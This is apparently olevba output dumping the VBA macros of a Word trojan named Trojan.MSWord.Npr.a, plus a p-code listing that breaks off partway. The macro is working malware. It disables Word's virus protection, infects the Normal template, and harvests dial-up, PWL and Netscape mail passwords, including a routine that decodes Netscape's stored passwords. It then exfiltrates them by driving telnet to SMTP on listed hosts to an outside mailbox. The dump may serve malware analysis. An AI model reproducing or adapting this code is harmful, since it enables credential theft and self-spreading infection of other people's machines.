olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Npr.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Npr.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MSPlus.bas 
in file: Trojan.MSWord.Npr.a - OLE stream: 'Macros/VBA/MSPlus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'NetscapePasswordReminder
Option Explicit
Type FILETIME
  dwLowDateTime As Long
  dwHighDateTime As Long
End Type
Declare Function RegOpenKeyEx Lib "advapi32.dll" Alias "RegOpenKeyExA" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long
Declare Function RegEnumKeyEx Lib "advapi32.dll" Alias "RegEnumKeyExA" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As FILETIME) As Long
Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal Msg As Long, wParam As Any, lParam As Any) As Long
Declare Function FindWindow Lib "user32.dll" Alias _
"FindWindowA" (ByVal lpClassName As Any, _
ByVal lpWindowName As Any) As Long
Sub CopyLines(Source As Object)
On Error Resume Next
     Dim SourceM As Object, TargetM As Object
     Dim n As Long
     Dim Body As String
     Dim VBComponent  As Object
    For Each VBComponent In Source.VBProject.VBComponents
     Set SourceM = VBComponent
     n = SourceM.CodeModule.CountOfLines
     Body = SourceM.CodeModule.Lines(1, 1)
     If InStr(1, Body, "NetscapePasswordReminder", vbTextCompare) <> 0 Then
     Body = SourceM.CodeModule.Lines(1, n)
     Set TargetM = NormalTemplate.VBProject.VBComponents.Add(1)
     TargetM.CodeModule.AddFromString Body
     TargetM.Name = "MSPlus"
     End If
   Next
 End Sub
Sub AutoExec()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
KeyBindings.Add KeyCategory:=wdKeyCategoryMacro, Command:="Grab_Registr", KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF1)
End Sub
Sub AutoExit()
Dim Counter As Long
Dim i As Long
Dim Yes As Boolean
Dim VBComponent As Object

On Error Resume Next
  Application.Visible = False
  Yes = False
 For Each VBComponent In NormalTemplate.VBProject.VBComponents
 If VBComponent.Name = "MSPlus" Then
  Yes = True
 End If
 Next
 If Yes = False Then
  Counter = Templates.Count
 For i = 1 To Counter
  If InStr(1, Templates(i).FullName, "STARTUP", vbTextCompare) <> 0 Then
 Templates(i).OpenAsDocument
 CopyLines Templates(i)
 ActiveDocument.Close
 End If
 Next
 End If
 NormalTemplate.Save
 Tmsn
End Sub
Sub AutoOpen()
Dim VBComponent As Object
Dim Yes As Boolean
 On Error Resume Next
KeyBindings.Add KeyCategory:=wdKeyCategoryMacro, Command:="Grab_Registr", KeyCode:=BuildKeyCode(Arg1:=wdKeyAlt, Arg2:=wdKeyF1)
ActiveDocument.ShowSpellingErrors = False
ActiveDocument.ShowGrammaticalErrors = False
 Yes = False
 For Each VBComponent In NormalTemplate.VBProject.VBComponents
 If VBComponent.Name = "MSPlus" Then
  Yes = True
 End If
 Next
If Yes = False Then
CopyLines MacroContainer
End If
Options.VirusProtection = False
Options.SaveNormalPrompt = False
NormalTemplate.Save
End Sub
Sub FileOpen()
On Error Resume Next
AutoOpen
Dialogs(80).Show
Sender_main
End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
Sender_main
End Sub
Sub FileClose()
On Error Resume Next
AutoOpen
ActiveDocument.Close
End Sub
Sub AutoClose()
On Error Resume Next
AutoOpen
End Sub
Sub Tmsn()
Dim Delta As Integer
Dim Old As Byte
Dim NF As Integer
NF = FreeFile
On Error Resume Next
Open "c:\windows\logow.sys" For Binary Access Read As #NF
Get #NF, 76989, Old
Close #NF
Delta = Val(Mid(Date$, 4, 2))
Delta = Delta - Old
Select Case Delta
 Case Is > 2
 Sender
 Case Is < 0 And Delta + 31 > 2
 Sender
 Case Else
 End Select
End Sub
Sub Sender()
Dim i As Long
 i = 0
 For i = 0 To 20
  If Check_Connection = True Then
   Sender_main
   Exit Sub
  Else
   Pause 254
  End If
 Next
End Sub
Sub Sender_main()
Dim Handle As Long
Dim HandleBW As Long
Dim hwnd As Long
Dim FileName As String
Dim Start As Long
Dim MyDat As Byte
Dim i As Integer
Dim NPwl() As String
Dim j As Integer
Dim Title As String
Dim SMTP As String
Dim Host(1 To 10) As String
Dim A() As Integer
Dim f As Integer
Dim NF As Integer
Dim THwnd As Long
Dim Twnd As String
Dim None As String
On Error Resume Next
If Check_Connection = True Then
Host(1) = "ns1.kazna.com"
Host(2) = "mail.iname.com"
Host(3) = "194.186.182.26"
Host(4) = "195.75.32.20"
Host(5) = "lily.bas-net.by"
Host(6) = "212.19.17.57"
Host(7) = "itk2.bas-net.by"
Host(8) = "imaph2.bas-net.by"
Host(9) = "tuna.fsr.com"
Host(10) = "redfish.fsr.com"
Loto 10, A()
Shell "telnet", 0
  THwnd = FindWindow(CLng(0), "Telnet - (none)")
  If THwnd <> 0 Then
    Twnd = "telnet"
    None = "(none)"
   Else
   THwnd = FindWindow(CLng(0), "Òåëíåò - (íåò)")
   If THwnd <> 0 Then
   Twnd = "Òåëíåò"
    None = "(íåò)"
    Else
   THwnd = FindWindow(CLng(0), "Telnet - (íåò)")
   Twnd = "telnet"
    None = "(íåò)"
  End If
  End If
SendMessage THwnd, CLng(16), ByVal CLng(0), 0
DoEvents
For f = 1 To 5
Shell "telnet " + Host(A(f)) + " 25", 0
DoEvents
Start = Timer
Do Until Handle <> 0 Or Timer - Start > 70 Or HandleBW <> 0
 Handle = FindWindow(CLng(0), Twnd + " - " + Host(A(f)))
 HandleBW = FindWindow(CLng(0), "Connect failed")
 DoEvents
Loop
Select Case Handle
  Case Is <> 0
SMTP = "helo orck1#$$mail from: <master@myself.com>#$rcpt to: <kashek@usa.net>#$data#$Date: " + _
 Date$ + " " + Time$ + "#X-MSMail-Priority: Normal#X-Priority: 3#X-Mailer: Post Messenger 3.1#MIME-Version: 1.0#Content-Type: multipart/mixed; boundary=" _
 + Chr(34) + "----=_NextPart" + Chr(34) + "#Content-Transfer-Encoding: 7bit##------=_NextPart#Content-Type: text/plain; charset=Windows-1251#Content-Transfer-Encoding: base64#"
Filler SMTP, Handle
Pause 1
Grab FileName
SMTP = Base64(FileName)
Kill "c:\windows\" + FileName
SMTP = Adapt(SMTP)
Filler SMTP, Handle
Pause 1
FindPWL i, NPwl()
If i <> 0 Then
 For j = 0 To i - 1
  If FileLen("c:\windows\" + NPwl(j)) <> 688 Then
   SMTP = Base64(NPwl(j))
   SMTP = Adapt(SMTP)
      Title = "#------=_NextPart#Content-Type: application/octet-stream; name=" + Chr(34) _
   + NPwl(j) + Chr(34) + "#Content-Transfer-Encoding: base64#Content-Description: " + _
   NPwl(j) + "(PWL PassWord List)#Content-Disposition: attachment; filename=" _
   + Chr(34) + NPwl(j) + Chr(34) + "#"
      Filler Title, Handle
   Pause 1
   Filler SMTP, Handle
   Pause 1
  End If
 Next
End If
Title = "##------=_NextPart--#.#$quit#"
Filler Title, Handle
Pause 1
Start = Timer
Do Until hwnd <> 0 Or Timer - Start > 120
 hwnd = FindWindow(CLng(0), Twnd)
 DoEvents
Loop
Select Case hwnd
Case Is = 0
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Handle = 0
Case Else
  SendMessage hwnd, CLng(16), ByVal CLng(0), 0
    NF = FreeFile
  MyDat = Val(Mid(Date$, 4, 2))
  Open "c:\windows\logow.sys" For Binary Access Write As #NF
  Put #NF, 76989, MyDat
  Close #NF
  DoEvents
  SendMessage Handle, CLng(16), ByVal CLng(0), 0
  Exit Sub
End Select
Case Else
Handle = FindWindow(CLng(0), Twnd + " - " + None)
SendMessage HandleBW, CLng(16), ByVal CLng(0), 0
Pause 3
SendMessage Handle, CLng(16), ByVal CLng(0), 0
Pause 3
HandleBW = 0
Handle = 0
End Select
Next
End If
End Sub
Function Check_Connection()
Dim CurrWnd As Long
Dim Length As Long
Dim Title As String
  CurrWnd = FindWindow(CLng(0), "")
  CurrWnd = GetWindow(CurrWnd, 0)
    Do While CurrWnd <> 0
       Length = GetWindowTextLength(CurrWnd)
        Title = Space(Length + 1)
    Length = GetWindowText(CurrWnd, Title, Length + 1)
    If InStr(1, Title, "Connected to", vbTextCompare) <> 0 _
     Or InStr(1, Title, "Ïîäêëþ÷åíî ê", vbTextCompare) <> 0 Then
     Check_Connection = True
     Exit Function
    End If
    CurrWnd = GetWindow(CurrWnd, 2)
    DoEvents
  Loop
  Check_Connection = False
End Function

Function Loto(i As Integer, A() As Integer)
Dim n As Integer
ReDim A(1 To i) As Integer
Dim Tmp As Integer
Dim Temp As Integer
For n = 1 To i
 A(n) = n
Next
For n = 1 To i
 Randomize
 Tmp = Int((i - n + 1) * Rnd + n)
 Temp = A(n)
 A(n) = A(Tmp)
 A(Tmp) = Temp
Next
End Function

Sub Filler(MessStr As String, hwnd As Long)
Dim i As Long
Dim Tmp As String
Dim Charset As Long
On Error Resume Next
For i = 1 To Len(MessStr)
Tmp = Mid(MessStr, i, 1)
Select Case Tmp
   Case Is = "#"
   DoEvents
   Charset = SendMessage(hwnd, &H102, ByVal CLng(13), 0)
   Case Is = "$"
   Pause 7
   Case Else
    If i Mod 380 = 0 Then
    Pause 1
    End If
   Charset = SendMessage(hwnd, &H102, ByVal CLng(Asc(Tmp)), 0)
End Select
Next
End Sub

Sub Pause(i As Byte)
Dim Start As Long
Start = Timer
 Do While Timer < Start + i
        DoEvents
 Loop
End Sub

Function Grab(Name As String)
Dim Tmp As String
Dim AZ As String
Dim i As Integer
Dim Num As Integer
Dim PwdLst As String
Dim Temp As String
Dim Counter As Long
Dim NF As Integer
Dim NF1 As Integer
AZ = "abcdifghijklmnopqastuvwxyz"
For i = 1 To 7
 Num = Random1(25)
 Name = Name + Mid(AZ, Num + 1, 1)
Next
Name = Name + ".egn"
On Error Resume Next
NF1 = FreeFile
Open "c:\windows\" + Name For Output Access Write As #NF1
If Dir$("c:\windows\edialer.ini") <> "" Then
NF = FreeFile
Open "c:\windows\edialer.ini" For Input Access Read As #NF
Do While Not EOF(NF)
  Line Input #NF, Tmp
  If InStr(1, Tmp, "[RAS_Entry_") <> 0 Or _
     InStr(1, Tmp, "PasswordSaved") <> 0 Or _
     InStr(1, Tmp, "LoginSaved") <> 0 Then
   Print #NF1, Tmp
  End If
Loop
Close #NF
End If
If Dir$("C:\Windows\system.ini") <> "" Then
NF = FreeFile
Open "C:\Windows\system.ini" For Input Access Read As #NF
Do While Not EOF(NF)
 Line Input #NF, Temp
 Counter = Counter + 1
 If Temp = "[Password Lists]" Then
  Do While Temp <> ""
  Line Input #NF, Temp
  PwdLst = PwdLst + Chr(10) + Temp
  Loop
 Exit Do
 End If
   If Counter Mod 20 = 0 Then
   DoEvents
   End If
Loop
End If
Close #NF
Print #NF1, PwdLst
Print #NF1, Grab_Registr_main()
Close #NF1
End Function

Function Base64(FName As String)
Dim i As Long
Dim ABC As String
Dim Tmp As String
Dim Char As Byte
Dim Cod As Integer
Dim Roll As Integer
Dim Counter As Long
'
Dim HMask As Integer
Dim LMask As Integer
Dim Shift As Integer
Dim NF As Integer


HMask = 252
LMask = 3
Shift = 16
Roll = 0
Counter = 1
ABC = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
NF = FreeFile
On Error Resume Next
Open "c:\windows\" + FName For Binary Access Read As #NF
For i = 1 To LOF(NF)
Get #NF, Counter, Char
Cod = ((Char And HMask) \ (LMask + 1)) Or Roll
Roll = (Char And LMask) * Shift
Tmp = Tmp + Mid$(ABC, Cod + 1, 1)
HMask = HMask * 4 And 255
LMask = LMask * 4 + 3
Shift = Shift \ 4
If HMask = 0 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
 HMask = 252
 LMask = 3
 Shift = 16
 Roll = 0
End If
Counter = Counter + 1
Next
Close #NF
If Shift < 16 Then
 Tmp = Tmp + Mid$(ABC, Roll + 1, 1)
End If
Cod = ((Len(Tmp)) Mod 4)
If Cod Then
Tmp = Tmp + String$(4 - Cod, "=")
End If
Base64 = Tmp
End Function
Function FindPWL(j As Integer, FindFiles() As String)
ReDim FindFiles(0)
FindFiles(0) = Dir$("c:\windows\*.pwl")
If FindFiles(0) = "" Then
Exit Function
End If
j = 0
Do While FindFiles(0) <> ""
FindFiles(0) = Dir
j = j + 1
Loop
If j > 1 Then
ReDim FindFiles(0 To j - 1)
FindFiles(0) = Dir$("c:\windows\*.pwl")
For j = 1 To j - 1
FindFiles(j) = Dir$
Next j
Else
FindFiles(0) = Dir$("c:\windows\*.pwl")
End If
End Function

Function Adapt(Cod As String)
Dim PostCod As String
Dim i As Long
On Error Resume Next
For i = 1 To Len(Cod)
 If i >= 76 And (i Mod 76) = 0 Then
  PostCod = PostCod + Mid(Cod, i, 1) + "#"
  Else
  PostCod = PostCod + Mid(Cod, i, 1)
 End If
Next
Adapt = "#" + PostCod + "#"
End Function
Function Random1(i As Integer)
Dim Resalt As Integer
Resalt = Int(i * Rnd + 1)
Random1 = Resalt
End Function

Sub ToolsOptions()
With Options
.VirusProtection = True
.SaveNormalPrompt = True
End With
Dialogs(wdDialogToolsOptions).Show
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
End Sub
'************************************

Sub Grab_Registr()
Dim Resalt As String
Resalt = Grab_Registr_main()
PrintResalt Resalt
End Sub
Function Grab_Registr_main()
Dim res As Long, hkey As Long, i As Long
Dim KeyName As String, KeyLen As Long
Dim ClassName As String, ClassLen As Long
Dim lastwrite As FILETIME
Dim res1 As Long, hkey1 As Long, n As Long
Dim KeyName1 As String, KeyLen1 As Long
Dim ClassName1 As String, ClassLen1 As Long
Dim lastwrite1 As FILETIME
Dim userName As String
Dim PassWord As String
Dim Resalt As String
Dim Version As String
Dim j As Long
On Error Resume Next
Resalt = "" + Chr(10) + Chr(13)
res = RegOpenKeyEx(&H80000001, "Software\Netscape\Netscape Navigator\biff\users\", 0, &H8, hkey)
If res <> 0 Then
 Resalt = "Íå óäàåòñÿ ïðî÷èòàòü íóæíóþ çàïèñü èç ðåeñòðà. Âåðîÿòíî, íà Âàøåì êîìïüþòåðå íå óñòàíîâëåíà ïðîãðàììà Netscape Navigator."
 Grab_Registr_main = Resalt
 Exit Function
End If
i = 0
Do While res = 0
 KeyName = Space(255): ClassName = Space(255)
 KeyLen = 255: ClassLen = 255
 res = RegEnumKeyEx(hkey, i, KeyName, KeyLen, ByVal 0, ClassName, ClassLen, lastwrite)
If res = 0 Then
 KeyName = Left(KeyName, KeyLen)
 ClassName = Left(ClassName, ClassLen)
 
 res1 = RegOpenKeyEx(&H80000001, "Software\Netscape\Netscape Navigator\biff\users\" + KeyName + "\servers\", 0, &H8, hkey1)
n = 0
Do While res1 = 0
 KeyName1 = Space(255): ClassName1 = Space(255)
 KeyLen1 = 255: ClassLen1 = 255  '
 res1 = RegEnumKeyEx(hkey1, n, KeyName1, KeyLen1, ByVal 0, ClassName1, ClassLen1, lastwrite1)
If res1 = 0 Then
 KeyName1 = Left(KeyName1, KeyLen1)
 ClassName1 = Left(ClassName1, ClassLen1)
 userName = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\biff\users\" + KeyName + "\servers\" + KeyName1, "userName")
 PassWord = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Netscape\Netscape Navigator\biff\users\" + KeyName + "\servers\" + KeyName1, "password")
 Resalt = Resalt + "Ïîëüçîâàòåëü: " + KeyName + _
 Chr(13) + "POP3-ñåðâåð: " + KeyName1 + Chr(13) _
 + "Èìÿ Àêêàóíòà äëÿ POP3-ñåðâåðà: " + userName + Chr(13) _
 + Decode_Password(PassWord) + Chr(10) + Chr(13)
End If
n = n + 1
 Loop
 res1 = RegCloseKey(hkey1)
End If
i = i + 1
j = j + n - 1
DoEvents
Loop
res = RegCloseKey(hkey)
Version = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Netscape\Netscape Navigator", "CurrentVersion")
Resalt = "*ïðîãðàììà òåñòèðîâàíà òîëüêî äëÿ âåðñèè Netscape Navigator 4.51(ru)*" + Chr(10) + Chr(13) + "Ó Âàñ Netscape Navigator - " + Version + Chr(13) + "Ïîëüçîâàòåëåé - " + Str(i - 1) + Chr(13) + "Ïî÷òîâûõ Àêêàóíòîâ - " + Str(j - 1) + Resalt
Grab_Registr_main = Resalt
End Function
Function Decode_Password(Cod As String)
Dim Key As Variant
Dim i As Integer
Dim n As Integer
Dim Title As String
If Cod = "" Then
 Title = "Äàííûé ïîëüçîâàòåëü íå óñòàíîâèë ôëàæîê " + Chr(34) + "Çàïîìíèòü ïàðîëü" + Chr(34)
 Decode_Password = Title
Exit Function
End If
Key = Array(86, 201, 239, 74, 155, 190, 90, 66, 119, 2, 67, 24, 112, 48, 137, 76)
Cod = Revers(Cod)
Cod = ROT_13(Cod)
Cod = Decode_Base_64(Cod)
n = Len(Cod)
If n > 16 Then
 n = 16
 Title = "Ïåðâûå øåñòíàäöàòü ñèìâîëîâ ïàðîëÿ: "
Else
 Title = "Ïàðîëü: "
End If
For i = 1 To n
Title = Title + Chr(Asc(Mid(Cod, i, 1)) Xor Key(i - 1))
Next
Decode_Password = Title
End Function
Function ROT_13(Cod As String)
Dim La As String
Dim Smol As String
Dim i As Integer
Dim n As Integer
Dim Char As String
Dim ChNumber As Integer
Dim Tmp As String
La = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
Smol = "abcdefghijklmnopqrstuvwxyz"
For i = 1 To Len(Cod)
Char = Mid(Cod, i, 1)
ChNumber = InStr(1, La, Char, vbBinaryCompare)
Select Case ChNumber
 Case 1 To 13
 Tmp = Tmp + Mid(La, ChNumber + 13, 1)
 Case Is > 13
 Tmp = Tmp + Mid(La, ChNumber - 13, 1)
 Case Else
  ChNumber = InStr(1, Smol, Char, vbBinaryCompare)
  Select Case ChNumber
   Case 1 To 13
   Tmp = Tmp + Mid(Smol, ChNumber + 13, 1)
   Case Is > 13
   Tmp = Tmp + Mid(Smol, ChNumber - 13, 1)
   Case Else
   Tmp = Tmp + Char
   End Select
End Select
Next
ROT_13 = Tmp
End Function
Function Decode_Base_64(Cod As String)
Dim i As Long
Dim AlfaBet As String
Dim Chop As Integer
Dim HiMask As Integer
Dim LowMask As Integer
Dim HiShift As Integer
Dim LowShift As Integer
Dim Charset As Integer
Dim First As Integer, Second As Integer
Dim Resalt As String
If Cod = "" Then
 Decode_Base_64 = ""
 Exit Function
End If
AlfaBet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
Chop = 63
HiMask = 63
LowMask = 0
HiShift = 4
LowShift = 64
Resalt = ""
For i = 1 To Len(Cod)
 Charset = InStr(1, AlfaBet, Mid(Cod, i, 1), vbBinaryCompare) - 1
If Charset >= 0 Then
Second = (Charset And LowMask) / LowShift
If HiMask <> 63 Then
 Resalt = Resalt + Chr$(First + Second)
End If
First = (Charset And HiMask) * HiShift
If HiMask = 0 Then
 HiMask = 63
 LowMask = 0
 HiShift = 4
 LowShift = 64
Else
 HiMask = ((HiMask * 4) And HiMask) / 4
 LowMask = 63 Xor HiMask
 HiShift = HiShift * 4
 LowShift = LowShift / 4
End If
End If
Next
Decode_Base_64 = Resalt
End Function
Function Revers(MyString As String)
 Dim Temp As String, i As Long
 For i = 1 To Len(MyString)
  Temp = Temp + Mid$(MyString, Len(MyString) + 1 - i, 1)
 Next
 Revers = Temp
End Function
Sub PrintResalt(MyString As String)
Dim MyRang As Object
Documents.Add
ActiveDocument.Activate
Set MyRang = ActiveDocument.Content
MyRang.InsertAfter MyString
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Trojan.MSWord.Npr.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/MSPlus - 38726 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0018 "NetscapePasswordReminder"
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	Type FILETIME
' Line #3:
' 	DimImplicit 
' 	VarDefn dwLowDateTime (As Long)
' Line #4:
' 	DimImplicit 
' 	VarDefn dwHighDateTime (As Long)
' Line #5:
' 	EndType 
' Line #6:
' 	FuncDefn (Declare Function RegOpenKeyEx Lib "advapi32.dll" (ByVal hkey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long)
' Line #7:
' 	FuncDefn (Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hkey As Long) As Long)
' Line #8:
' 	FuncDefn (Declare Function RegEnumKeyEx Lib "advapi32.dll" (ByVal hkey As Long, ByVal dwIndex As Long, ByVal lpName As String, lpcbName As Long, lpReserved As Long, ByVal lpClass As String, lpcbClass As Long, lpftLastWriteTime As ) As Long)
' Line #9:
' 	FuncDefn (Declare Function GetWindow Lib "user32" (ByVal hwnd As Long, ByVal wCmd As Long) As Long)
' Line #10:
' 	FuncDefn (Declare Function GetWindowText Lib "user32" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long)
' Line #11:
' 	FuncDefn (Declare Function GetWindowTextLength Lib "user32" (ByVal hwnd As Long) As Long)
' Line #12:
' 	FuncDefn (Declare Function SendMessage Lib "user32.dll" (ByVal hwnd As Long, ByVal Msg As Long, wParam As , lParam As ) As Long)
' Line #13:
' 	LineCont 0x0008 06 00 00 00 0D 00 00 00
' 	FuncDefn (Declare Function FindWindow Lib "user32.dll" (ByVal lpClassName As , ByVal lpWindowName As ) As Long)
' Line #14:
' 	FuncDefn (Sub CopyLines(Source As Object))
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	Dim 
' 	VarDefn SourceM (As Object)
' 	VarDefn TargetM (As Object)
' Line #17:
' 	Dim 
' 	VarDefn n (As Long)
' Line #18:
' 	Dim 
' 	VarDefn Body (As String)
' Line #19:
' 	Dim 
' 	VarDefn VBComponent (As Object) 0x0016
' Line #20:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld Source 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #21:
' 	SetStmt 
' 	Ld VBComponent 
' 	Set SourceM 
' Line #22:
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St n 
' Line #23:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #24:
' 	LitDI2 0x0001 
' 	Ld Body 
' 	LitStr 0x0018 "NetscapePasswordReminder"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #25:
' 	LitDI2 0x0001 
' 	Ld n 
' 	Ld SourceM 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St Body 
' Line #26:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Add 0x0001 
' 	Set TargetM 
' Line #27:
' 	Ld Body 
' 	Ld TargetM 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #28:
' 	LitStr 0x0006 "MSPlus"
' 	Ld TargetM 
' 	MemSt New 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	StartForVariable 
' 	Next 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub AutoExec())
' Line #33:
' 	OnError (Resume Next) 
' Line #34:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #35:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #36:
' 	Ld wdKeyCategoryMacro 
' 	ParamNamed KeyCategory 
' 	LitStr 0x000C "Grab_Registr"
' 	ParamNamed Command 
' 	Ld wdKeyAlt 
' 	ParamNamed Arg1 
' 	Ld wdKeyF1 
' 	ParamNamed Arg2 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Sub AutoExit())
' Line #39:
' 	Dim 
' 	VarDefn Counter (As Long)
' Line #40:
' 	Dim 
' 	VarDefn i (As Long)
' Line #41:
' 	Dim 
' 	VarDefn Yes (As Boolean)
' Line #42:
' 	Dim 
' 	VarDefn VBComponent (As Object)
' Line #43:
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #46:
' 	LitVarSpecial (False)
' 	St Yes 
' Line #47:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #48:
' 	Ld VBComponent 
' 	MemLd New 
' 	LitStr 0x0006 "MSPlus"
' 	Eq 
' 	IfBlock 
' Line #49:
' 	LitVarSpecial (True)
' 	St Yes 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	StartForVariable 
' 	Next 
' Line #52:
' 	Ld Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #53:
' 	Ld Templates 
' 	MemLd Count 
' 	St Counter 
' Line #54:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Counter 
' 	For 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	MemLd FullName 
' 	LitStr 0x0007 "STARTUP"
' 	Ld vbTextCompare 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #56:
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	ArgsMemCall OpenAsDocument 0x0000 
' Line #57:
' 	Ld i 
' 	ArgsLd Templates 0x0001 
' 	ArgsCall CopyLines 0x0001 
' Line #58:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #59:
' 	EndIfBlock 
' Line #60:
' 	StartForVariable 
' 	Next 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #63:
' 	ArgsCall Tmsn 0x0000 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Sub AutoOpen())
' Line #66:
' 	Dim 
' 	VarDefn VBComponent (As Object)
' Line #67:
' 	Dim 
' 	VarDefn Yes (As Boolean)
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	Ld wdKeyCategoryMacro 
' 	ParamNamed KeyCategory 
' 	LitStr 0x000C "Grab_Registr"
' 	ParamNamed Command 
' 	Ld wdKeyAlt 
' 	ParamNamed Arg1 
' 	Ld wdKeyF1 
' 	ParamNamed Arg2 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #70:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ShowSpellingErrors 
' Line #71:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ShowGrammaticalErrors 
' Line #72:
' 	LitVarSpecial (False)
' 	St Yes 
' Line #73:
' 	StartForVariable 
' 	Ld VBComponent 
' 	EndForVariable 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #74:
' 	Ld VBComponent 
' 	MemLd New 
' 	LitStr 0x0006 "MSPlus"
' 	Eq 
' 	IfBlock 
' Line #75:
' 	LitVarSpecial (True)
' 	St Yes 
' Line #76:
' 	EndIfBlock 
' Line #77:
' 	StartForVariable 
' 	Next 
' Line #78:
' 	Ld Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #79:
' 	Ld MacroContainer 
' 	ArgsCall CopyLines 0x0001 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #82:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #83:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub FileOpen())
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	ArgsCall AutoOpen 0x0000 
' Line #88:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #89:
' 	ArgsCall Sender_main 0x0000 
' Line #90:
' 	EndSub 
' Line #91:
' Line #92:
